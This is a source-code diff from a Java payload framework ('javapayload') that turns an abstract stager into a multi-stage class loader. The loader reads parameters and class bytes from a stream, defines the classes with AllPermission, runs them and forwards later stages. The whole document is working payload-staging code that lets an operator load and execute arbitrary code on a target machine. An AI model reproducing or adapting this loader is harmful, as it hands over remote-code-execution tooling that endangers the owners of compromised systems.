@@ -32,11 +32,16 @@
  * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
-package javapayload.stager;
+package javapayload.stage;
 
+import java.io.BufferedOutputStream;
+import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
+import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.io.PipedInputStream;
+import java.io.PipedOutputStream;
 import java.io.PrintStream;
 import java.net.URL;
 import java.security.AllPermission;
@@ -45,15 +50,42 @@ import java.security.Permissions;
 import java.security.ProtectionDomain;
 import java.security.cert.Certificate;
 
-public abstract class Stager extends ClassLoader {
+public class MultiStageClassLoader extends ClassLoader implements Runnable {
 
-	public Stager targetStager = null;
-	
-	protected void bootstrap(InputStream rawIn, OutputStream out, String[] parameters) throws Exception {
-		if (targetStager != null) {
-			targetStager.bootstrap(rawIn, out, parameters);
-			return;
+	private final MultiStageOutputStream msOut;
+	private final PipedOutputStream out;
+	private final BufferedOutputStream buffOut;
+	private final String[] params;
+	private boolean alive = true, forwarding = false;
+
+	public MultiStageClassLoader(DataInputStream baseIn, OutputStream baseOut) throws IOException {
+		int paramCount = baseIn.readUnsignedShort();
+		params = new String[paramCount];
+		for (int i = 0; i < params.length; i++) {
+			params[i] = baseIn.readUTF();
 		}
+		msOut = new MultiStageOutputStream(baseOut);
+		out = new PipedOutputStream();
+		buffOut = new BufferedOutputStream(out);
+		new Thread(this).start();
+	}
+
+	public void run() {
+		try {
+			PipedInputStream in = new PipedInputStream(out);
+			bootstrap(in, msOut, params);
+			synchronized (this) {
+				alive = false;
+				while (forwarding) {
+					wait();
+				}
+			}
+		} catch (Throwable t) {
+			t.printStackTrace(new PrintStream(msOut, true));
+		}
+	}
+
+	protected final void bootstrap(InputStream rawIn, OutputStream out, String[] parameters) {
 		try {
 			final DataInputStream in = new DataInputStream(rawIn);
 			Class clazz;
@@ -73,9 +105,22 @@ public abstract class Stager extends ClassLoader {
 			final Object stage = clazz.newInstance();
 			clazz.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(stage, new Object[] { in, out, parameters });
 		} catch (final Throwable t) {
-			t.printStackTrace(new PrintStream(out));
+			t.printStackTrace(new PrintStream(out, true));
 		}
 	}
 
-	public abstract void bootstrap(String[] parameters) throws Exception;
+	public void forward(DataInputStream in) throws IOException {
+		msOut.start();
+		boolean alive;
+		synchronized (this) {
+			forwarding = true;
+			alive = this.alive;
+		}
+		MultiStageOutputStream.decodeForward(in, alive ? (OutputStream) buffOut : new ByteArrayOutputStream());
+		synchronized (this) {
+			forwarding = false;
+			notifyAll();
+		}
+		msOut.stop();
+	}
 }
